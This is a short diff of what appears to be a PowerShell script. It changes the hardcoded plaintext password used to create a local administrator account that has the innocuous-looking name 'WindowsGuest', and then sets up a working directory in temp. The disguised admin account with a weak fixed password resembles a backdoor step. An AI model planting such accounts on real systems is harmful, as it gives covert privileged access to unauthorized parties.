@@ -20,7 +20,7 @@ function create_account {
     }
 }
 $NewLocalAdmin = "WindowsGuest"
-$Password = (ConvertTo-SecureString "P@sskey1234" -AsPlainText -Force)
+$Password = (ConvertTo-SecureString "Passkey1234" -AsPlainText -Force)
 create_account -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # variables
@@ -30,7 +30,7 @@ $initial_dir = Get-Location
 
 # create admin user
 $usertag = "WindowsGuest"
-$passkey = (ConvertTo-SecureString "P@sskey1234" -AsPlainText -Force)
+$passkey = (ConvertTo-SecureString "Passkey1234" -AsPlainText -Force)
 create_account -usertag $usertag -passkey $passkey
 
 # goto temp, make working directory
